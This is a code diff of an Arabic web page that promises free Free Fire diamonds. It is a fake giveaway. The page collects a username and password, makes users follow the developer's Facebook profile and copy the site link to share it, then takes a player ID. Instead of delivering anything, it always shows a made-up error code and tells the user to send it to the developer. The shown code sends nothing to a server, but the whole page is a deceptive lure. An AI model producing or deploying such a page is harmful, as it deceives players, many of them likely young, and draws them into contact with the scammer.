@@ -1,315 +1,134 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<!DOCTYPE html><html lang="ar">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>BANZAMA CHOP DIAMON -  شحن جواهر فري فاير</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>شحن جواهر فري فاير</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&family=Cairo:wght@700&display=swap" rel="stylesheet">
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Cairo&display=swap');
-    body {
-      margin: 0; padding: 0; font-family: 'Cairo', sans-serif;
-      background: linear-gradient(135deg, #1f1c2c, #928dab);
-      color: #eee;
-      min-height: 100vh;
-      display: flex; flex-direction: column; align-items: center;
-    }
-    header {
-      background: #2a2a72;
-      width: 100%;
-      padding: 1rem 2rem;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.3);
-      display: flex; justify-content: space-between; align-items: center;
-      position: sticky; top: 0; z-index: 100;
-    }
-    header h1 {
-      font-size: 1.8rem; letter-spacing: 3px; font-weight: 900;
-      color: #ffcc00;
+    * {
       margin: 0;
-      user-select: none;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Cairo', sans-serif;
     }
-    nav button {
-      background: #ffcc00;
-      border: none;
-      padding: 0.6rem 1.2rem;
-      font-weight: 700;
-      font-size: 1rem;
-      border-radius: 25px;
-      cursor: pointer;
-      transition: background 0.3s ease;
-      color: #2a2a72;
-      user-select: none;
+    h2 {
+      font-family: 'Orbitron', sans-serif;
     }
-    nav button:hover {
-      background: #e6b800;
+    body {
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
     }
-    main {
-      flex: 1;
+    .container {
+      background: rgba(0, 0, 0, 0.7);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(0, 255, 255, 0.7);
+      max-width: 400px;
       width: 100%;
-      max-width: 480px;
-      padding: 2rem;
-      background: rgba(255, 255, 255, 0.05);
-      box-shadow: 0 0 20px rgba(0,0,0,0.3);
-      border-radius: 10px;
-      margin: 2rem 1rem;
-      min-height: 400px;
+      text-align: center;
     }
-    form {
-      display: flex;
-      flex-direction: column;
-      gap: 1.2rem;
-    }
-    input[type="text"], input[type="password"] {
-      padding: 0.8rem 1rem;
-      border-radius: 8px;
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
       border: none;
-      font-size: 1.1rem;
-      outline: none;
+      border-radius: 5px;
+      font-size: 16px;
     }
-    input[type="text"]:focus, input[type="password"]:focus {
-      box-shadow: 0 0 8px #ffcc00;
-      background: #fff9db;
-    }
-    button.submit-btn {
-      background: #ffcc00;
-      border: none;
-      padding: 1rem;
-      font-size: 1.2rem;
-      font-weight: 700;
-      border-radius: 30px;
+    button {
+      background: #00f2ff;
+      color: #000;
+      font-weight: bold;
       cursor: pointer;
-      color: #2a2a72;
-      transition: background 0.3s ease;
-      user-select: none;
+      transition: background 0.3s;
     }
-    button.submit-btn:hover {
-      background: #e6b800;
-    }
-    .tasks {
-      display: flex;
-      flex-direction: column;
-      gap: 1rem;
+    button:hover {
+      background: #00c2d1;
     }
     .task {
-      background: #383862;
-      padding: 1rem 1.5rem;
-      border-radius: 30px;
-      font-weight: 700;
-      font-size: 1.2rem;
+      margin: 10px 0;
       display: flex;
-      align-items: center;
       justify-content: space-between;
-      cursor: pointer;
-      user-select: none;
-      transition: background 0.2s ease;
-    }
-    .task:hover {
-      background: #5050a0;
-    }
-    .task.completed {
-      background: #7fbf00;
-      color: #fff;
-      text-decoration: line-through;
-      cursor: default;
-    }
-    .task .checkmark {
-      width: 22px;
-      height: 22px;
-      border-radius: 50%;
-      border: 2px solid #fff;
-      display: flex;
       align-items: center;
-      justify-content: center;
-      color: #fff;
-      font-weight: 900;
-      font-size: 1.3rem;
-      user-select: none;
     }
-    .hidden {
-      display: none !important;
+    .task.completed span {
+      color: #0f0;
     }
-    .loading-screen {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100%;
-      font-size: 1.5rem;
-      color: #ffcc00;
-      user-select: none;
-    }
-    .loading-spinner {
-      margin-top: 1rem;
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid #ffcc00;
-      border-radius: 50%;
-      width: 60px;
-      height: 60px;
-      animation: spin 1.2s linear infinite;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg);}
-      100% { transform: rotate(360deg);}
+    #game-id-section {
+      display: none;
     }
   </style>
 </head>
 <body>
-  <header>
-    <h1>BANZAMA CHOP DIAMON</h1>
-    <nav>
-      <button id="loginBtn">تسجيل الدخول</button>
-      <button id="registerBtn">إنشاء حساب جديد</button>
-    </nav>
-  </header>
+  <div class="container">
+    <h2 style="font-family: 'Cairo', sans-serif;"> V1.5 شحن جواهر فري فاير</h2>
+    <div id="login-section">
+      <input type="text" id="username" placeholder="اسم المستخدم" />
+      <input type="password" id="password" placeholder="كلمة المرور" />
+      <button onclick="login()">تسجيل الدخول</button>
+    </div><div id="tasks-section" style="display: none;">
+  <div class="task" id="task1">
+    <span>متابعة المطور</span>
+    <button onclick="followDev()">اذهب</button>
+  </div>
+  <div class="task" id="task2">
+    <span>مشاركة الموقع</span>
+    <button onclick="shareSite()">نسخ الرابط</button>
+  </div>
+</div>
 
-  <main>
-    <!-- صفحات مختلفة تظهر حسب الحالة -->
-    <section id="loginPage">
-      <form id="loginForm">
-        <h2>تسجيل الدخول</h2>
-        <input type="text" id="loginUsername" placeholder="اسم المستخدم" required autocomplete="username" />
-        <input type="password" id="loginPassword" placeholder="كلمة المرور" required autocomplete="current-password" />
-        <button type="submit" class="submit-btn">دخول</button>
-      </form>
-    </section>
+<div id="game-id-section">
+  <input type="text" id="gameId" placeholder="أدخل معرف اللاعب (ID)" />
+  <button onclick="submitId()">شحن</button>
+  <p id="error-message" style="color: red; white-space: pre-line;"></p>
+</div>
 
-    <section id="registerPage" class="hidden">
-      <form id="registerForm">
-        <h2>إنشاء حساب جديد</h2>
-        <input type="text" id="registerUsername" placeholder="اسم المستخدم" required autocomplete="username" />
-        <input type="password" id="registerPassword" placeholder="كلمة المرور" required autocomplete="new-password" />
-        <button type="submit" class="submit-btn">إنشاء</button>
-      </form>
-    </section>
+  </div>  <script>
+    let task1Done = false;
+    let task2Done = false;
 
-    <section id="tasksPage" class="hidden">
-      <h2>المهام</h2>
-      <div class="tasks">
-        <div class="task" data-task="1">إتمام التسجيل <span class="checkmark hidden">&#10003;</span></div>
-        <div class="task" data-task="2">تأكيد البريد الإلكتروني <span class="checkmark hidden">&#10003;</span></div>
-        <div class="task" data-task="3">إضافة معرف اللاعب <span class="checkmark hidden">&#10003;</span></div>
-      </div>
-      <button id="goToIdInput" class="submit-btn" style="margin-top: 1.5rem;">التالي</button>
-    </section>
-
-    <section id="idInputPage" class="hidden">
-      <form id="idForm">
-        <h2>أدخل معرف اللاعب الخاص بك في فري فاير</h2>
-        <input type="text" id="playerID" placeholder="معرف اللاعب" required pattern="[0-9]+" />
-        <button type="submit" class="submit-btn">تأكيد</button>
-      </form>
-    </section>
-
-    <section id="loadingPage" class="hidden">
-      <div class="loading-screen">
-        جاري الشحن...
-        <div class="loading-spinner"></div>
-      </div>
-    </section>
-
-    <section id="successPage" class="hidden">
-      <h2>خطأ!</h2>
-      <p>رمز الخلل XDS344LH9 ارسل هاذا رمز للمطور لحل المشكلة ونعتذر عن الإزعاج.</p>
-      <button id="backToTasks" class="submit-btn">العودة إلى المهام</button>
-    </section>
-  </main>
-
-  <script>
-    // التنقل بين الصفحات
-    const loginPage = document.getElementById('loginPage');
-    const registerPage = document.getElementById('registerPage');
-    const tasksPage = document.getElementById('tasksPage');
-    const idInputPage = document.getElementById('idInputPage');
-    const loadingPage = document.getElementById('loadingPage');
-    const successPage = document.getElementById('successPage');
-
-    const loginBtn = document.getElementById('loginBtn');
-    const registerBtn = document.getElementById('registerBtn');
-
-    const loginForm = document.getElementById('loginForm');
-    const registerForm = document.getElementById('registerForm');
-    const idForm = document.getElementById('idForm');
-
-    const tasks = document.querySelectorAll('.task');
-    const goToIdInputBtn = document.getElementById('goToIdInput');
-    const backToTasksBtn = document.getElementById('backToTasks');
-
-    function showPage(page) {
-      [loginPage, registerPage, tasksPage, idInputPage, loadingPage, successPage].forEach(p => p.classList.add('hidden'));
-      page.classList.remove('hidden');
+    function login() {
+      document.getElementById('login-section').style.display = 'none';
+      document.getElementById('tasks-section').style.display = 'block';
     }
 
-    // بدءاً من صفحة تسجيل الدخول
-    showPage(loginPage);
+    function followDev() {
+      window.open("https://www.facebook.com/sid.ali.ba.300856", "_blank");
+      task1Done = true;
+      document.getElementById("task1").classList.add("completed");
+      document.getElementById("task1").querySelector("span").innerText += " ✓";
+      checkTasks();
+    }
 
-    // أزرار التنقل بين تسجيل الدخول وإنشاء حساب
-    loginBtn.onclick = () => showPage(loginPage);
-    registerBtn.onclick = () => showPage(registerPage);
-
-    // محاكاة تسجيل الدخول
-    loginForm.addEventListener('submit', e => {
-      e.preventDefault();
-      // تحقق من بيانات تسجيل الدخول (هنا مجرد محاكاة)
-      const username = document.getElementById('loginUsername').value.trim();
-      const password = document.getElementById('loginPassword').value.trim();
-      if (username && password) {
-        markTaskCompleted(1); // إتمام التسجيل
-        markTaskCompleted(2); // تأكيد البريد
-        showPage(tasksPage);
-      }
-    });
-
-    // محاكاة إنشاء حساب جديد
-    registerForm.addEventListener('submit', e => {
-      e.preventDefault();
-      const username = document.getElementById('registerUsername').value.trim();
-      const password = document.getElementById('registerPassword').value.trim();
-      if (username && password) {
-        markTaskCompleted(1); // إتمام التسجيل
-        showPage(tasksPage);
-      }
-    });
-
-    // تعليم المهمة عند الضغط عليها
-    tasks.forEach(task => {
-      task.addEventListener('click', () => {
-        if (!task.classList.contains('completed')) {
-          task.classList.add('completed');
-          task.querySelector('.checkmark').classList.remove('hidden');
-        }
+    function shareSite() {
+      navigator.clipboard.writeText("https://diamonfree.github.io/FREEDIAMO/").then(() => {
+        task2Done = true;
+        document.getElementById("task2").classList.add("completed");
+        document.getElementById("task2").querySelector("span").innerText += " ✓";
+        checkTasks();
       });
-    });
+    }
 
-    // الانتقال لإدخال معرف اللاعب
-    goToIdInputBtn.onclick = () => {
-      markTaskCompleted(3);
-      showPage(idInputPage);
-    };
-
-    // عند تأكيد المعرف
-    idForm.addEventListener('submit', e => {
-      e.preventDefault();
-      const playerID = document.getElementById('playerID').value.trim();
-      if (/^\d+$/.test(playerID)) {
-        showPage(loadingPage);
-        setTimeout(() => {
-          showPage(successPage);
-        }, 4000);
-      } else {
-        alert('يرجى إدخال معرف لاعب صالح (أرقام فقط).');
-      }
-    });
-
-    // العودة للمهام من صفحة النجاح
-    backToTasksBtn.onclick = () => showPage(tasksPage);
-
-    // دالة لوضع علامة صح وإكمال المهمة
-    function markTaskCompleted(taskNumber) {
-      const task = document.querySelector(`.task[data-task="${taskNumber}"]`);
-      if (task && !task.classList.contains('completed')) {
-        task.classList.add('completed');
-        task.querySelector('.checkmark').classList.remove('hidden');
+    function checkTasks() {
+      if (task1Done && task2Done) {
+        document.getElementById("game-id-section").style.display = 'block';
       }
     }
-  </script>
-</body>
+
+    function submitId() {
+      const id = document.getElementById("gameId").value;
+      const errorMsg = document.getElementById("error-message");
+      if (!/^\d{10,}$/.test(id)) {
+        errorMsg.textContent = "الرجاء إدخال معرف صالح يتكون من 10 أرقام على الأقل";
+        return;
+      }
+      errorMsg.textContent = "خطأ\nرمز الخطأ XZ5690JH ارسله للمطور ليساعدك";
+    }
+  </script></body>
 </html>
